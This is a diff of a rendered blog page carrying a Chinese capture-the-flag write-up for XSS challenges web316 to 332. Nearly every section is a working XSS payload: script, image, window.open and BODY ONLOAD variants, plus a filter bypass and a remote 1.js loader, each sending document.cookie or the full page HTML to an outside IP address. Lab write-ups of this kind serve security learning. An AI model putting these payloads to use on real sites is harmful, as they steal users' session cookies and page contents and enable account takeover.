@@ -135,24 +135,17 @@
 
   <div class="content" itemprop="articleBody">
     <h2 id="web316-反弹cookie到vps"><a href="#web316-反弹cookie到vps" class="headerlink" title="web316 反弹cookie到vps"></a>web316 反弹cookie到vps</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="keyword">var</span> img = <span class="built_in">document</span>.createElement(<span class="string">&quot;img&quot;</span>);img.src = <span class="string">&quot;http://91.67.253.121:1234/?cookie=&quot;</span>+<span class="built_in">document</span>.cookie;alert(<span class="regexp">/success/</span>);&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;<span class="built_in">window</span>.open(<span class="string">&#x27;http://91.67.253.121:1237/?cookie=&#x27;</span>+<span class="built_in">document</span>.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
 <p><img src="1612952403326.png" alt="1612952403326"></p>
 <h2 id="web317-319-新姿势"><a href="#web317-319-新姿势" class="headerlink" title="web317-319 新姿势"></a>web317-319 新姿势</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">BODY</span> <span class="attr">ONLOAD</span>=<span class="string">document.location</span>=<span class="string">&#x27;http://91.67.253.121:1237?cookie=&#x27;</span>+<span class="attr">document.cookie</span>;&gt;</span></span><br></pre></td></tr></table></figure>
-
 <h2 id="web320-过滤空格"><a href="#web320-过滤空格" class="headerlink" title="web320 过滤空格"></a>web320 过滤空格</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;BODY/ONLOAD=document.location=&#x27;http://91.67.253.121:1237?cookie=&#x27;+document.cookie;&gt;</span><br></pre></td></tr></table></figure>
-
 <h2 id="328"><a href="#328" class="headerlink" title="328"></a>328</h2><p>用户名存在xss</p>
 <p>找了几个xss平台好像都没什么用</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://91.67.253.121:1237/1.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
 <p>1.js</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var img = new Image();</span><br><span class="line">img.src = &quot;http://91.67.253.121:1237/?cookie=&quot;+document.cookie;</span><br><span class="line">document.body.append(img);</span><br></pre></td></tr></table></figure>
-
 <h2 id="329"><a href="#329" class="headerlink" title="329"></a>329</h2><p>1.js</p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="keyword">new</span> Image();</span><br><span class="line">img.src = <span class="string">&quot;http://91.67.253.121:1237/?cookie=&quot;</span>+<span class="built_in">document</span>.getElementsByTagName(<span class="string">&#x27;html&#x27;</span>)[<span class="number">0</span>].innerHTML;</span><br><span class="line"><span class="built_in">document</span>.body.append(img);</span><br></pre></td></tr></table></figure>
-
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://91.67.253.121:1237/1.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
 <p>会把整个html返回,然后找到flag</p>
 <p><img src="1613011316572.png" alt="1613011316572"></p>
 <h2 id="332"><a href="#332" class="headerlink" title="332"></a>332</h2><p><img src="1612972060218.png" alt="1612972060218"></p>
